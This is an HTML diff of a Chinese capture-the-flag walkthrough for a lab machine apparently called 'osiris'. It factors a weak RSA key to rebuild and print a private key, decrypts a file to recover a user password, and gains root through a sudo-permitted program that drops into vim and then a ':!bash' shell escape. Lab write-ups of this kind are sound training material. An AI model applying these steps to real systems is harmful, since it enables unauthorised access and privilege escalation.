 
-'''
-#生成公钥
-rsa_components = (int(n), e)
-keypair = RSA.construct(rsa_components)
-with open('pubckey.pem', 'wb') as f :
-    f.write(keypair.exportKey())
-'''
+<span class="pl-s">'''</span>
+<span class="pl-s">#生成公钥</span>
+<span class="pl-s">rsa_components = (int(n), e)</span>
+<span class="pl-s">keypair = RSA.construct(rsa_components)</span>
+<span class="pl-s">with open('pubckey.pem', 'wb') as f :</span>
+<span class="pl-s">    f.write(keypair.exportKey())</span>
+<span class="pl-s">'''</span>
 
-#生成私钥
-rsa_components = (int(n),e,int(d))#gmpy2模块计算的格式mpz，需强制转换成int参与计算
-keypair = RSA.construct(rsa_components)
-with open('private.pem', 'wb') as f :
-    f.write(keypair.exportKey())
-'''
-
-└─# cat private.pem
------BEGIN RSA PRIVATE KEY-----
-MIGsAgEAAiEAyi/6FvQs4lbjPrDTdO/zI2zBgNeQQyMMkTjqNAfewRECAwEAAQIh
-AK3yTsf2tLLZq9IgkRv24AbdmxAYvRgmyA/I66tUb+SRAhEA/DPhQ+5LX+thkzRn
-r5Nq5QIRAM07T+4pkQ862tZ0HIlaHr0CEQDNdEImAeF7kZhawE1bdh+VAhBAKX/m
-vHYOZd8O1sQpKNSdAhEAuVeKzLA7tfBrUC+xa8y+8A==
------END RSA PRIVATE KEY-----
-'''
-
-</code></pre>
+<span class="pl-c">#生成私钥</span>
+<span class="pl-s1">rsa_components</span> <span class="pl-c1">=</span> (<span class="pl-en">int</span>(<span class="pl-s1">n</span>),<span class="pl-s1">e</span>,<span class="pl-en">int</span>(<span class="pl-s1">d</span>))<span class="pl-c">#gmpy2模块计算的格式mpz，需强制转换成int参与计算</span>
+<span class="pl-s1">keypair</span> <span class="pl-c1">=</span> <span class="pl-c1">RSA</span>.<span class="pl-c1">construct</span>(<span class="pl-s1">rsa_components</span>)
+<span class="pl-k">with</span> <span class="pl-en">open</span>(<span class="pl-s">'private.pem'</span>, <span class="pl-s">'wb'</span>) <span class="pl-k">as</span> <span class="pl-s1">f</span> :
+    <span class="pl-s1">f</span>.<span class="pl-c1">write</span>(<span class="pl-s1">keypair</span>.<span class="pl-c1">exportKey</span>())
+<span class="pl-s">'''</span>
+<span class="pl-s"></span>
+<span class="pl-s">└─# cat private.pem</span>
+<span class="pl-s">-----BEGIN RSA PRIVATE KEY-----</span>
+<span class="pl-s">MIGsAgEAAiEAyi/6FvQs4lbjPrDTdO/zI2zBgNeQQyMMkTjqNAfewRECAwEAAQIh</span>
+<span class="pl-s">AK3yTsf2tLLZq9IgkRv24AbdmxAYvRgmyA/I66tUb+SRAhEA/DPhQ+5LX+thkzRn</span>
+<span class="pl-s">r5Nq5QIRAM07T+4pkQ862tZ0HIlaHr0CEQDNdEImAeF7kZhawE1bdh+VAhBAKX/m</span>
+<span class="pl-s">vHYOZd8O1sQpKNSdAhEAuVeKzLA7tfBrUC+xa8y+8A==</span>
+<span class="pl-s">-----END RSA PRIVATE KEY-----</span>
+<span class="pl-s">'''</span></pre></div>
 <p>再使用<code class="notranslate">OpenSSL</code>工具进行RSA解密<code class="notranslate">secret.enc</code>的明文</p>
-<pre lang="shell" class="notranslate"><code class="notranslate">love@osiris:/tmp$ openssl rsautl -decrypt -in secret.enc -inkey private.pem -out decrypted.txt
+<div class="highlight highlight-source-shell"><pre class="notranslate">love@osiris:/tmp$ openssl rsautl -decrypt -in secret.enc -inkey private.pem -out decrypted.txt
 love@osiris:/tmp$ cat decrypted.txt
-sh1m0mur4Bl4ckh4t
-</code></pre>
+sh1m0mur4Bl4ckh4t</pre></div>
 <p>获得<code class="notranslate">tomu</code>的密码为<code class="notranslate">sh1m0mur4Bl4ckh4t</code></p>
 <h5>轩禹CTF_RSA工具3.6</h5>
 <p><code class="notranslate">风二西</code>师傅还写过一个RSA的解题工具<code class="notranslate">轩禹CTF_RSA工具3.6.1.exe</code>,导入公钥和密文后可以直接获得明文<code class="notranslate">sh1m0mur4Bl4ckh4t</code>，测试解密后的明文就是<code class="notranslate">tomu</code>账户的密码</p>
 <p><a target="_blank" rel="noopener noreferrer nofollow" href="https://camo.githubusercontent.com/4c6177f12907aa74e492a5d2356d37d98f66ef29326f419b10eb0d210de47f05/68747470733a2f2f67697465652e636f6d2f736875693636362f696d616765732f7261772f6d61737465722f696d616765732f696d6167652d32303235303830393134323930323339342e706e67"><img src="https://camo.githubusercontent.com/4c6177f12907aa74e492a5d2356d37d98f66ef29326f419b10eb0d210de47f05/68747470733a2f2f67697465652e636f6d2f736875693636362f696d616765732f7261772f6d61737465722f696d616765732f696d6167652d32303235303830393134323930323339342e706e67" alt="image-20250809142902394" data-canonical-src="https://gitee.com/shui666/images/raw/master/images/image-20250809142902394.png" style="max-width: 100%;"></a></p>
-<pre lang="shell" class="notranslate"><code class="notranslate">love@osiris:/home/mitnick$ su - tomu
-Contraseña:#sh1m0mur4Bl4ckh4t
-tomu@osiris:~$ id
-uid=1001(tomu) gid=1001(tomu) grupos=1001(tomu)
-</code></pre>
+<div class="highlight highlight-source-shell"><pre class="notranslate">love@osiris:/home/mitnick$ su - tomu
+Contraseña:<span class="pl-c"><span class="pl-c">#</span>sh1m0mur4Bl4ckh4t</span>
+tomu@osiris:<span class="pl-k">~</span>$ id
+uid=1001(tomu) gid=1001(tomu) grupos=1001(tomu)</pre></div>
 <p><code class="notranslate">轩禹CTF_RSA工具3.6.1.exe</code>使用教程参考风二西B站[<a href="https://www.bilibili.com/video/BV1MK411m75Y" rel="nofollow">视频</a>](<a href="https://www.bilibili.com/video/BV1MK411m75Y" rel="nofollow">https://www.bilibili.com/video/BV1MK411m75Y</a>)</p>
-<pre lang="shell" class="notranslate"><code class="notranslate">#轩禹CTF_RSA工具3.6.1
-https://www.bilibili.com/video/BV1MK411m75Y
-</code></pre>
+<div class="highlight highlight-source-shell"><pre class="notranslate"><span class="pl-c"><span class="pl-c">#</span>轩禹CTF_RSA工具3.6.1</span>
+https://www.bilibili.com/video/BV1MK411m75Y</pre></div>
 <p>直接利用公钥和密文进行RSA解密的python脚本如下</p>
-<pre lang="python" class="notranslate"><code class="notranslate">from Crypto.PublicKey import RSA
-import libnum
-import gmpy2
-with open("secret.enc", 'rb') as f:
-    c = f.read()
-c=libnum.s2n(c)
-with open("publickey.pub", 'rb') as f:
-    key = f.read()
-rsakey = RSA.importKey(key)
-n= rsakey.n
-e= rsakey.e
-print(n)
-#http://factordb.com/分解n
-p=272799705830086927219936172916283678397
-q=335234831001780341003153415948249295589
-phi=(p-1)*(q-1)
-d=libnum.invmod(e,phi)
-m=pow(c,d,n)
-print(libnum.n2s(int(m)))
-#b'\x02\x8fx~\x04\xdc;\x19\xbd\x99\x10\x96\x00sh1m0mur4Bl4ckh4t\n'
-</code></pre>
+<div class="highlight highlight-source-python"><pre class="notranslate"><span class="pl-k">from</span> <span class="pl-v">Crypto</span>.<span class="pl-v">PublicKey</span> <span class="pl-k">import</span> <span class="pl-c1">RSA</span>
+<span class="pl-k">import</span> <span class="pl-s1">libnum</span>
+<span class="pl-k">import</span> <span class="pl-s1">gmpy2</span>
+<span class="pl-k">with</span> <span class="pl-en">open</span>(<span class="pl-s">"secret.enc"</span>, <span class="pl-s">'rb'</span>) <span class="pl-k">as</span> <span class="pl-s1">f</span>:
+    <span class="pl-s1">c</span> <span class="pl-c1">=</span> <span class="pl-s1">f</span>.<span class="pl-c1">read</span>()
+<span class="pl-s1">c</span><span class="pl-c1">=</span><span class="pl-s1">libnum</span>.<span class="pl-c1">s2n</span>(<span class="pl-s1">c</span>)
+<span class="pl-k">with</span> <span class="pl-en">open</span>(<span class="pl-s">"publickey.pub"</span>, <span class="pl-s">'rb'</span>) <span class="pl-k">as</span> <span class="pl-s1">f</span>:
+    <span class="pl-s1">key</span> <span class="pl-c1">=</span> <span class="pl-s1">f</span>.<span class="pl-c1">read</span>()
+<span class="pl-s1">rsakey</span> <span class="pl-c1">=</span> <span class="pl-c1">RSA</span>.<span class="pl-c1">importKey</span>(<span class="pl-s1">key</span>)
+<span class="pl-s1">n</span><span class="pl-c1">=</span> <span class="pl-s1">rsakey</span>.<span class="pl-c1">n</span>
+<span class="pl-s1">e</span><span class="pl-c1">=</span> <span class="pl-s1">rsakey</span>.<span class="pl-c1">e</span>
+<span class="pl-en">print</span>(<span class="pl-s1">n</span>)
+<span class="pl-c">#http://factordb.com/分解n</span>
+<span class="pl-s1">p</span><span class="pl-c1">=</span><span class="pl-c1">272799705830086927219936172916283678397</span>
+<span class="pl-s1">q</span><span class="pl-c1">=</span><span class="pl-c1">335234831001780341003153415948249295589</span>
+<span class="pl-s1">phi</span><span class="pl-c1">=</span>(<span class="pl-s1">p</span><span class="pl-c1">-</span><span class="pl-c1">1</span>)<span class="pl-c1">*</span>(<span class="pl-s1">q</span><span class="pl-c1">-</span><span class="pl-c1">1</span>)
+<span class="pl-s1">d</span><span class="pl-c1">=</span><span class="pl-s1">libnum</span>.<span class="pl-c1">invmod</span>(<span class="pl-s1">e</span>,<span class="pl-s1">phi</span>)
+<span class="pl-s1">m</span><span class="pl-c1">=</span><span class="pl-en">pow</span>(<span class="pl-s1">c</span>,<span class="pl-s1">d</span>,<span class="pl-s1">n</span>)
+<span class="pl-en">print</span>(<span class="pl-s1">libnum</span>.<span class="pl-c1">n2s</span>(<span class="pl-en">int</span>(<span class="pl-s1">m</span>)))
+<span class="pl-c">#b'\x02\x8fx~\x04\xdc;\x19\xbd\x99\x10\x96\x00sh1m0mur4Bl4ckh4t\n'</span></pre></div>
 <p>通过<code class="notranslate">publickey.pub、secret.enc</code>两个文件<code class="notranslate">RSA解密</code>后获得<code class="notranslate">tomu</code>的密码为<code class="notranslate">sh1m0mur4Bl4ckh4t</code></p>
 <h5>拿到<code class="notranslate">user.txt</code></h5>
-<pre lang="shell" class="notranslate"><code class="notranslate">tomu@osiris:~$ id
+<div class="highlight highlight-source-shell"><pre class="notranslate">tomu@osiris:<span class="pl-k">~</span>$ id
 uid=1001(tomu) gid=1001(tomu) grupos=1001(tomu)
-tomu@osiris:~$ cd
-tomu@osiris:~$ ls
+tomu@osiris:<span class="pl-k">~</span>$ <span class="pl-c1">cd</span>
+tomu@osiris:<span class="pl-k">~</span>$ ls
 nokitel.md  nokitel.png  user.txt
-tomu@osiris:~$ cat user.txt
-612701a03669485d****************
-</code></pre>
+tomu@osiris:<span class="pl-k">~</span>$ cat user.txt
+612701a03669485d<span class="pl-k">****************</span></pre></div>
 <h3>7.获得<code class="notranslate">root</code>权限</h3>
 <p><code class="notranslate">sudo -l</code>可以root权限执行<code class="notranslate">/opt/Contempt/Contempt</code></p>
-<pre lang="shell" class="notranslate"><code class="notranslate">tomu@osiris:~$ sudo -l
-Matching Defaults entries for tomu on osiris:
-    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin
+<div class="highlight highlight-source-shell"><pre class="notranslate">tomu@osiris:<span class="pl-k">~</span>$ sudo -l
+Matching Defaults entries <span class="pl-k">for</span> tomu on osiris:
+    env_reset, mail_badpass, secure_path=/usr/local/sbin<span class="pl-cce">\:</span>/usr/local/bin<span class="pl-cce">\:</span>/usr/sbin<span class="pl-cce">\:</span>/usr/bin<span class="pl-cce">\:</span>/sbin<span class="pl-cce">\:</span>/bin
 
 User tomu may run the following commands on osiris:
-    (root) /opt/Contempt/Contempt
-</code></pre>
+    (root) /opt/Contempt/Contempt</pre></div>
 <p>运行<code class="notranslate">Contempt</code>选,择第二个选项进入<code class="notranslate">VIM</code><br>
 <a target="_blank" rel="noopener noreferrer nofollow" href="https://camo.githubusercontent.com/ae3a09002a4ab3b5bd3c821023fc2f59199330344d84b8e0c7f8ec1d78e96b2e/68747470733a2f2f67697465652e636f6d2f736875693636362f696d616765732f7261772f6d61737465722f696d616765732f696d6167652d32303235303830393134343830353732352e706e67"><img src="https://camo.githubusercontent.com/ae3a09002a4ab3b5bd3c821023fc2f59199330344d84b8e0c7f8ec1d78e96b2e/68747470733a2f2f67697465652e636f6d2f736875693636362f696d616765732f7261772f6d61737465722f696d616765732f696d6167652d32303235303830393134343830353732352e706e67" alt="image-20250809144805725" data-canonical-src="https://gitee.com/shui666/images/raw/master/images/image-20250809144805725.png" style="max-width: 100%;"></a></p>
 <p>再输入<code class="notranslate">:!bash</code>即可获得<code class="notranslate">root</code>权限</p>
 <p><a target="_blank" rel="noopener noreferrer nofollow" href="https://camo.githubusercontent.com/76bbc070aa7872ecd23dab669a8bca0014a1863cb51feca55c877ff418c47970/68747470733a2f2f67697465652e636f6d2f736875693636362f696d616765732f7261772f6d61737465722f696d616765732f696d6167652d32303235303830393134343734363834392e706e67"><img src="https://camo.githubusercontent.com/76bbc070aa7872ecd23dab669a8bca0014a1863cb51feca55c877ff418c47970/68747470733a2f2f67697465652e636f6d2f736875693636362f696d616765732f7261772f6d61737465722f696d616765732f696d6167652d32303235303830393134343734363834392e706e67" alt="image-20250809144746849" data-canonical-src="https://gitee.com/shui666/images/raw/master/images/image-20250809144746849.png" style="max-width: 100%;"></a></p>
 <h5>拿到<code class="notranslate">root.txt</code></h5>
-<pre lang="shell" class="notranslate"><code class="notranslate">root@osiris:/home/tomu# id
+<div class="highlight highlight-source-shell"><pre class="notranslate">root@osiris:/home/tomu# id
 uid=0(root) gid=0(root) grupos=0(root)
-root@osiris:/home/tomu# cd
-root@osiris:~# ls
+root@osiris:/home/tomu# <span class="pl-c1">cd</span>
+root@osiris:<span class="pl-k">~</span><span class="pl-c"><span class="pl-c">#</span> ls</span>
 root.sh
-root@osiris:~# cat root.sh
-#!/bin/sh
+root@osiris:<span class="pl-k">~</span><span class="pl-c"><span class="pl-c">#</span> cat root.sh</span>
+<span class="pl-c"><span class="pl-c">#!</span>/bin/sh</span>
 
 clear
 
-greenColour="\e[0;32m\033[1m"
-endColour="\033[0m\e[0m"
+greenColour=<span class="pl-s"><span class="pl-pds">"</span>\e[0;32m\033[1m<span class="pl-pds">"</span></span>
+endColour=<span class="pl-s"><span class="pl-pds">"</span>\033[0m\e[0m<span class="pl-pds">"</span></span>
 
-printf "\n${greenColour}███████╗██████╗ ███████╗███████╗    ███╗   ███╗██╗████████╗███╗   ██╗██╗ ██████╗██╗  ██╗"
-printf "\n${greenColour}██╔════╝██╔══██╗██╔════╝██╔════╝    ████╗ ████║██║╚══██╔══╝████╗  ██║██║██╔════╝██║ ██╔╝"
-printf "\n${greenColour}█████╗  ██████╔╝█████╗  █████╗      ██╔████╔██║██║   ██║   ██╔██╗ ██║██║██║     █████╔╝ "
-printf "\n${greenColour}██╔══╝  ██╔══██╗██╔══╝  ██╔══╝      ██║╚██╔╝██║██║   ██║   ██║╚██╗██║██║██║     ██╔═██╗ "
-printf "\n${greenColour}██║     ██║  ██║███████╗███████╗    ██║ ╚═╝ ██║██║   ██║   ██║ ╚████║██║╚██████╗██║  ██╗"
-printf "\n${greenColour}╚═╝     ╚═╝  ╚═╝╚══════╝╚══════╝    ╚═╝     ╚═╝╚═╝   ╚═╝   ╚═╝  ╚═══╝╚═╝ ╚═════╝╚═╝  ╚═╝\n${endColour}"
-printf "\t\nflag --&gt; 1e271c5ce97e76ae**************** \n"
-root@osiris:~
-</code></pre>
+<span class="pl-c1">printf</span> <span class="pl-s"><span class="pl-pds">"</span>\n<span class="pl-smi">${greenColour}</span>███████╗██████╗ ███████╗███████╗    ███╗   ███╗██╗████████╗███╗   ██╗██╗ ██████╗██╗  ██╗<span class="pl-pds">"</span></span>
+<span class="pl-c1">printf</span> <span class="pl-s"><span class="pl-pds">"</span>\n<span class="pl-smi">${greenColour}</span>██╔════╝██╔══██╗██╔════╝██╔════╝    ████╗ ████║██║╚══██╔══╝████╗  ██║██║██╔════╝██║ ██╔╝<span class="pl-pds">"</span></span>
+<span class="pl-c1">printf</span> <span class="pl-s"><span class="pl-pds">"</span>\n<span class="pl-smi">${greenColour}</span>█████╗  ██████╔╝█████╗  █████╗      ██╔████╔██║██║   ██║   ██╔██╗ ██║██║██║     █████╔╝ <span class="pl-pds">"</span></span>
+<span class="pl-c1">printf</span> <span class="pl-s"><span class="pl-pds">"</span>\n<span class="pl-smi">${greenColour}</span>██╔══╝  ██╔══██╗██╔══╝  ██╔══╝      ██║╚██╔╝██║██║   ██║   ██║╚██╗██║██║██║     ██╔═██╗ <span class="pl-pds">"</span></span>
+<span class="pl-c1">printf</span> <span class="pl-s"><span class="pl-pds">"</span>\n<span class="pl-smi">${greenColour}</span>██║     ██║  ██║███████╗███████╗    ██║ ╚═╝ ██║██║   ██║   ██║ ╚████║██║╚██████╗██║  ██╗<span class="pl-pds">"</span></span>
+<span class="pl-c1">printf</span> <span class="pl-s"><span class="pl-pds">"</span>\n<span class="pl-smi">${greenColour}</span>╚═╝     ╚═╝  ╚═╝╚══════╝╚══════╝    ╚═╝     ╚═╝╚═╝   ╚═╝   ╚═╝  ╚═══╝╚═╝ ╚═════╝╚═╝  ╚═╝\n<span class="pl-smi">${endColour}</span><span class="pl-pds">"</span></span>
+<span class="pl-c1">printf</span> <span class="pl-s"><span class="pl-pds">"</span>\t\nflag --&gt; 1e271c5ce97e76ae**************** \n<span class="pl-pds">"</span></span>
+root@osiris:<span class="pl-k">~</span></pre></div>
 <p>群主大佬的<a href="https://www.bilibili.com/video/BV1B88Cz2Et2" rel="nofollow">WP</a></p></div>
 <div style="font-size:small;margin-top:8px;float:right;"></div>
 
